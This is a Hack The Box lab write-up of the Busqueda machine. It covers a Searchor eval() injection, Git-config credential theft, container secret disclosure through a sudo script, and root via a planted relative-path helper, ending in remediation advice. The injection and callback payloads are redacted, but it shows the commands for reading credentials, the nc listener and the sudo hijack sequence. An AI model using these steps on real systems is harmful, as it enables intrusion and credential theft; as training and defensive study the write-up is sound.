---
title: "Busqueda — Searchor Expression Injection and Relative-Path Sudo Escalation"
description: "Unsafe evaluation in a Searchor search request yields command execution; exposed Git credentials, container environment inspection through sudo, and relative-path execution in a root script extend access."
type: case-study
platform: Hack The Box
content_type: machine
status: published-ready
addedAt: "2026-09-14"
tags:
  - linux
  - flask
  - command-injection
  - gitea
  - sudo
objective: "Assess unsafe evaluation in a Flask/Searchor search request, credentials exposed in a deployment repository, and a root-run maintenance script that resolves a helper by relative path."
tools:
  - rustscan
  - python3
  - sudo
  - netcat
skill: "Python expression injection, credential discovery, and Linux privilege escalation through a delegated maintenance script"
outcome: "Command execution as the application service account, recovered Git credentials, container environment secret disclosure, and root command execution via a relative-path helper script"
---

## At a glance

| Field | Value |
|---|---|
| Difficulty | Easy |
| Target environment | Ubuntu Linux; Apache httpd 2.4.52 fronting a Python/Flask application built on Searchor |
| Starting position | Unauthenticated network access |
| Objective | Assess unsafe evaluation in a Flask/Searchor search request, credentials exposed in a deployment repository, and a root-run maintenance script that resolves a helper by relative path |
| Outcome | Command execution as the application service account; root command execution via a relative-path script invoked by a root-run maintenance command |

## Searchor eval() injection to relative-path root

Busqueda is an Easy Hack The Box Linux lab whose web front end runs a Flask search application built on Searchor. The `query` parameter reaches a Python `eval()` call, so a crafted search request runs operating-system commands as the application service account. Post-exploitation follows credentials left in the application's Git configuration into an internal Gitea instance, inspects container environment variables through a delegated sudo maintenance script, and escalates to root by planting the helper that the script's `full-checkup` action resolves by relative path. Target identifiers, credentials, and secret values are replaced with role-based placeholders; command syntax is preserved. See [how evidence is handled](/method/).

**Attack path:** **Searchor `eval()` injection → service-account shell → Git remote credential exposure → container environment secret disclosure via sudo `docker-inspect` → relative-path `full-checkup` helper → root**

## Target, search application, and objective

- **Target:** an Ubuntu Linux host exposing SSH and an Apache-fronted HTTP application.
- **Application:** a Flask search service whose footer identifies the Searchor library, presented as a search-engine selector and a `query` field; the site requires a virtual host mapping to reach.
- **Starting position:** unauthenticated network access; directory enumeration returned little of interest.
- **Objective:** assess unsafe expression evaluation in the search request, credential exposure in the deployment repository, and the privilege boundary created by the allowed maintenance script.
- **Constraints:** all activity stayed inside the Hack The Box lab environment.

## Evidence: query injection to relative-path helper

### 1. Service Discovery

Observation: a full-port scan exposes SSH and a single HTTP service.

```bash
rustscan -a <TARGET_IP> --ulimit 5000 -- -Pn -sC -sV -oN <SCAN_OUTPUT>
```

```text
22/tcp open  ssh   OpenSSH 8.9p1 Ubuntu
80/tcp open  http  Apache httpd 2.4.52
```

Significance: HTTP is the only application-reachable service, and the search interface identifies a Python/Flask stack built on Searchor, so the query field is the initial attack surface; the SSH banner identifies the platform.

Result: SSH and Apache HTTP are exposed, and the Searchor-backed search application is the target surface.

### 2. Search Request Injection and Command Execution

Observation: the `query` parameter is passed into a Python expression. I checked `'` and `/`, which change the response, and a crafted value breaks out of the expected string context to invoke an operating-system command.

```http
POST /search HTTP/1.1
Host: <TARGET_HOST>
Content-Type: application/x-www-form-urlencoded

engine=Google&query=<PYTHON_EXPRESSION_INJECTION>
```

The executed command returns a shell in the application directory:

```text
<SERVICE_USER>@<TARGET_HOST>:<APPLICATION_DIRECTORY>$
```

Significance: because the request value reaches `eval()`, search input becomes arbitrary code execution under the application service account. The defect is the Searchor `eval()` issue tracked as CVE-2023-43364, fixed in 2.4.2.

Result: the returned shell establishes a command channel as `<SERVICE_USER>` in the application directory.

### 3. Git Configuration Credential Exposure

Observation: the application directory contains a readable `.git` directory whose remote URL embeds credentials.

```bash
cat <APPLICATION_DIRECTORY>/.git/config
```

```text
url = http://<GIT_USER>:<GIT_PASSWORD>@<GITEA_HOST>/<OWNER>/<REPOSITORY>.git
```

The internal services bind to loopback, so the Gitea instance is not directly reachable:

```bash
ss -tulpn 2>/dev/null
```

```text
127.0.0.1:3000  Gitea
127.0.0.1:3306  MySQL
```

Significance: a repository remote carries a credential pair for the internal Gitea service, and the loopback bindings show that service is reachable only through a tunnel.

Result: the repository configuration yields a Gitea credential pair, and the loopback bindings identify the internal services.

### 4. Restricted Sudo Maintenance Script

Observation: local sudo rights allow the service account to run one maintenance script as root with arbitrary trailing arguments.

```bash
sudo -l
```

```text
(root) /usr/bin/python3 <MAINTENANCE_SCRIPT> *
```

Significance: the delegation covers a single interpreter and script but accepts any argument, and the script exposes `docker-ps`, `docker-inspect`, and `full-checkup` actions, a root context offered through a constrained interface.

Result: a root-run maintenance script is reachable through the delegated sudo rule.

### 5. Container Environment Secret Disclosure

Observation: the `docker-ps` action lists the running containers, and `docker-inspect` returns the environment of a chosen container.

```bash
sudo /usr/bin/python3 <MAINTENANCE_SCRIPT> docker-ps
```

```text
gitea/gitea:latest
mysql:8
```

```bash
sudo /usr/bin/python3 <MAINTENANCE_SCRIPT> docker-inspect '{{.Config.Env}}' <DATABASE_CONTAINER>
```

```text
MYSQL_USER=<DATABASE_USER>
MYSQL_PASSWORD=<DATABASE_PASSWORD>
MYSQL_DATABASE=<DATABASE_NAME>
```

Significance: the maintenance script returns raw container environment variables, disclosing the database credentials in cleartext: the application's backend secret handed over through a permitted root action.

Result: Gitea database credentials are recovered from the container environment.

### 6. Relative-Path Execution as Root

Observation: the script's `full-checkup` branch builds its command from a relative path, so the executable is resolved from the caller's current directory rather than a fixed trusted location.

```python
elif action == 'full-checkup':
    arg_list = ['./full-checkup.sh']
    print(run_command(arg_list))
```

Action: plant the named helper in the working directory and invoke the root sudo action from there:

```bash
nc -nlvp <LISTEN_PORT>
```

```bash
printf '%s\n' '<SANITIZED_CALLBACK_PAYLOAD>' > full-checkup.sh
chmod +x full-checkup.sh
sudo /usr/bin/python3 <MAINTENANCE_SCRIPT> full-checkup
```

```text
root@<TARGET_HOST>:<WORKING_DIRECTORY># whoami
root
```

Significance: because root runs `./full-checkup.sh` from a caller-controlled working directory, a constrained sudo rule becomes arbitrary root code execution.

Result: the privileged `whoami` output confirms root command execution.

## One decision: base64-encode the injected shell

| Challenge | Decision | Rationale |
|---|---|---|
| Special characters in the injected command risked breaking the evaluated expression | Base64-encoded the reverse shell before sending it through the `query` parameter | Avoids quoting and bad-character issues in the injected command |

## Outcome: service shell and root via a relative path

The lab ends with root command execution, established by the privileged `whoami` output. Two transitions are recorded without retained command output, so I could not verify them directly: the leaked Git password also authenticated the service account locally, and the disclosed database password granted Administrator access to the internal Gitea instance that held the maintenance script source.

## Recommendations: eval(), Git credentials, container env, and relative paths

1. **User input evaluated as code.** The search `query` reached `eval()`, which turned search input into command execution as the application account. *Recommendation:* remove dynamic evaluation of request data and use an allowlisted lookup, as Searchor 2.4.2 did. *Detection:* review application code for `eval()`/`exec()` on user input and monitor web processes for unexpected child processes.
2. **Credentials in Git remote configuration.** A deployment `.git/config` embedded a credential pair for an internal repository host. *Recommendation:* use deploy keys or a credential helper instead of embedding secrets in remote URLs, and rotate any credential that has been exposed. *Detection:* scan working directories and repository configuration for credentials in remote URLs.
3. **Secrets in container environment variables.** `docker-inspect` returned the Gitea database password in cleartext. *Recommendation:* deliver secrets through a secret manager or mounted files rather than environment variables, and restrict who may inspect container configuration. *Detection:* log inspection of environment variables and production-container configuration, then flag unexpected access.
4. **Relative-path execution in a root-run script.** The `full-checkup` branch ran `./full-checkup.sh` from the caller's directory, so a delegated sudo rule became arbitrary root code execution. *Recommendation:* reference helper executables by absolute, root-owned paths and validate accepted arguments; avoid wildcard sudo rules that reach an interpreter. *Detection:* audit sudo policy for interpreter or wildcard delegations and alert on changes to scripts in privileged working directories.

## References

- [Hack The Box — Busqueda](https://app.hackthebox.com/machines/Busqueda) (retired machine)
- [NVD — CVE-2023-43364](https://nvd.nist.gov/vuln/detail/CVE-2023-43364) (Searchor `eval()` code execution)
- [GitHub Advisory — GHSA-66m2-493m-crh2](https://github.com/ArjunSharda/Searchor/security/advisories/GHSA-66m2-493m-crh2) (Searchor vendor advisory)
- [Searchor](https://github.com/ArjunSharda/Searchor) (search library)
- [RustScan](https://github.com/RustScan/RustScan) (fast port scanner)
- [netcat (`nc`)](https://man.openbsd.org/nc.1) (network listener)
- [Python — `eval`](https://docs.python.org/3/library/functions.html#eval) (dynamic expression evaluation)
- [sudoers manual](https://www.sudo.ws/docs/man/sudoers.man/) (sudo policy and command delegation)
